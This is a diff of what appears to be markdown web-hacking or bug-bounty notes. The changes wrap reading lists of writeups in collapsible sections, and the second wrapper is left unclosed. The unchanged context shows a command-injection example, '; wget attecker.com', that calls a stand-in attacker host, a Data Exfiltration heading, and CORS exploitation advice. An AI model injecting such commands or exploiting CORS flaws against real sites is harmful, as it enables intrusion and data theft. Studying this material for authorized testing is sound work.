@@ -26,9 +26,12 @@ we request to our server.
 ```console
 ; wget attecker.com
 ```
-#### let's read
+<details>
+<summary>Lets Read</summary>
+
 - [we hacked apple for 3 months](samcurry.net/hacking-apple/#vuln4)
 - [LocalTapiola: RCE using bash command](hackerone.com/reports/303061)
+</details>
 
 ### Data Exfiltration
 For Data Exfiltration (extracting data) u should use these two:
@@ -322,4 +325,8 @@ if a site (`company.com`) works with cookies and has an endpoint which returns s
 
 when u see `Access-Control-Allow-Origin: https://attacker.com` and `Access-Control-Allow-Credentials: True` dont rush to report the vulnarablity. just report when u exploit it completely.
 
+
+<details>
+<summary>Let's Read</summary>
 > see [this](https://www.youtube.com/watch?v=AUQSYobXbZI) for better view *(part of CORS misconfiguration)*.
+<details>
